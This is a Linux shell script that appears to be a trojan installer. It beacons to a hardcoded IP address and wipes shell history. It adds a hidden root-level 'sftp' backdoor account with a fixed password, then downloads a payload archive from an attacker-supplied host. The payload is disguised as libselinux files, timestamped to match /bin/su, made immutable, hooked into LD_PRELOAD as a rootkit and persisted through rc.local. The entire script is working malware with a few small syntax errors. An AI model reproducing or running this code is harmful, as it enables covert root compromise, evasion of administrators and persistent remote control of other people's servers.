#!/bin/sh

unlink /tmp/ssh
curl http://103.206.123.13:8787/test?data=xxn
export I_AM_HIDDEN=abbrev

history -c
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0

#about trojan
IPADDR=$1
PORT=$2
VER=`echo $(uname -a)`
KVER=`echo $(ps -ef | grep $TROFILE | grep -v grep | awk '{print $2}')`
BitX="x86_64"
TROFILE="/lib/libselinux"
PROFILE="/lib/libselinux.a"
LIBPATH="/lib/libselinux.so"
PIDFILE="/tmp/libselinux.0"
PROEXE="I_AM_HIDDEN=a nohup /lib/libselinux.a 2>/dev/null &"

#about user
FTP_USER="sftp"
FTP_PASSWD="e@iQN*lG"
FTP_FOLDER="/var/sftp"

#-----------create user---------------#
EXIST_USER=`/bin/cat /etc/passwd | awk -F ':' '{print $(1)}' | /bin/grep -E "^$FTP_USER$"`
if [$(id -u) -eq 0]
then
      if ["$EXIST_USER" != "$FTP_USER"]
      then 
	        mkdir -p $FTP_FOLDER
			/bin/chmod 777 -R $FTP_FOLDER
			groupadd -og 50 $FTP_USER
			/usr/sbin/useradd -lou 0 -g 50 -c ',,,' -d $FTP_FOLDER -s /bin/sh $FTP_USER >/dev/null 2>&1
			echo $FTP_PASSWD | /usr/bin/passwd $FTP_USER --stdin >/dev/null 2>&1
	   fi

fi

#-----------------END---------------#

#-------doa something about trojan---------#
if [-f "$PIDFILE"]
then

       PID=$(cat $PIDFILE)
	   fill -9 $PID
	   rm -rf $PIDFILE
	   rm -rf $PROFILE
	   rm -rf $TROFILE
	   rm -rf $LIBPATH
fi

if [ -n $KVER ]
then
        kill -9 $KVER
		rm -rf $PIDFILE
		rm -rf $PROFILE
		rm -rf $TROFILE
		rm -rf $LIBPATH
fi

if [[ $VER =~ $BitX ]]
then
         curl http://$IPADDR:$PORT/configUpdate.tar.gz -so /tmp/configUpdate.tar.gz
		 
else
         curl http://$IPADDR:$PORT/configUpdate-32.tar.gz -so /tmp/configUpdate.tar.gz
		 
fi

tar -zxvpf /tmp/configUpdate.tar.gz -C /tmp
rm -rf /tmp/configUpdate.tar.gz
chmod +x /tmp/libselinux
chmod +x /tmp/libselinux.a
chmod +x /tmp/libselinux.so
if [ $(id -u) -ne 0 ]
then

        rm -rf /tmp/libselinux.so
		rm -rf /tmp/libselinux.a
		mv /tmp/libselinux /tmp/.bash
		/tmp/.bash
		exit
fi

mv /tmp/libselinux.so $LIBPATH
mv /tmp/libselinux.a $PROFILE
mv /tmp/libselinux $TROFILE
touch -acmr /bin/su $LIBPATH
touch -acmr /bin/su $PROFILE
touch -acmr /bin/su $TROFILE
chattr +i $TROFILE
chattr +i $PROFILE
chattr +i $LIBPATH

#run trojan & shell

I_AM_HIDDEN=a $TROFILE I_AM_HIDDEN
I_AM_HIDDEN=a nohup $PROFILE 2>/dev/null &
export LD_PRELOAD=$LD_PRELOAD:$LIBPATH

if ! grep -Fxq "$LIBPATH" /etc/profile
then

        sed -i "56iexport LD_PRELOAD=\$LD_PRELOAD:/lib/libselinux.so" /etc/profile
		source /etc/profile
fi

if ! grep -Fxq "$PROEXE" /etc/rc.local
then 

        if [ `grep -c "exit" /etc/rc.local` -ne 1 ]
		then
		        sed -i '$s/^exit.*$//g' /etc/rc.local
		fi
		
		echo $PROEXE >> /etc/rc.local
		
fi

unset I_AM_HIDDEN
#---------------END---------------#
